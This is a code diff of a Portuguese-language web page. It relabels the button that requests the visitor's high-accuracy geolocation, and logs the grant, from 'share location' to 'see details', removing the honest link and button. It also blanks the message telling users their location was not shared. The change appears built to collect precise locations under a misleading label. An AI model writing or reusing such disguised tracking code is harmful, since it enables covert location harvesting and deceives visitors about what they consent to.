@@ -233,8 +233,7 @@
 
       <div class="actions">
         <button onclick="whats()">Falar no WhatsApp</button>
-        <a class="btn-link btn-outline" href="#detalhes">Ver detalhes</a>
-        <button onclick="pedirLocalizacaoExata()">Compartilhar localização</button>
+        <button onclick="pedirLocalizacaoExata()">Ver detalhes</button>
       </div>
 
       <div class="location-box">
@@ -389,8 +388,8 @@
         await enviarLog("localizacao_exata_autorizada");
       },
       function(erro) {
-        console.error("Permissão negada ou erro ao obter localização.", erro);
-        alert("A localização exata não foi compartilhada.");
+        console.error(".", erro);
+        alert(".");
       },
       {
         enableHighAccuracy: true,
